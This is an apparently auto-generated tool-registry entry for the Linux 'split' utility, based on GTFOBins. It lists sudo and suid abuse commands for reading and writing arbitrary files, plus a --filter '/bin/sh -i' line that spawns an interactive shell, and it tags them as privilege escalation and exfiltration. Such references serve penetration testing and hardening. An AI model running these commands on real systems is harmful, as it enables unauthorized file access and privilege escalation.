---
id: system-file-split
namespace: system:file:split
name: split
description: "Split files into fixed-size pieces; can read and write files and spawn shells."
author: GTFOBins
version: 1.0.0
capabilities:
- system.file.read
- system.file.write
- security.privilege-escalation.shell
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- split
parameters: []
features: []
execution:
  template: split
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Read arbitrary files (sudo, suid, unprivileged)
  command: 'split -b 999 --additional-suffix suffix /path/to/input-file prefix

    cat prefixaasuffix'
- description: Write to arbitrary files (sudo, suid, unprivileged)
  command: split -b 999 --additional-suffix suffix /path/to/input-file prefix
- description: Spawn an interactive shell (sudo, suid, unprivileged)
  command: split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/split/
techniques:
- collection
- exfiltration
- privilege-escalation
- execution
install:
- method: apt
  package_name: coreutils
  commands:
  - apt-get install -y coreutils
---


# split

split is a command-line utility. Split a file into pieces; can also read arbitrary files, write to arbitrary files, spawn an interactive shell.
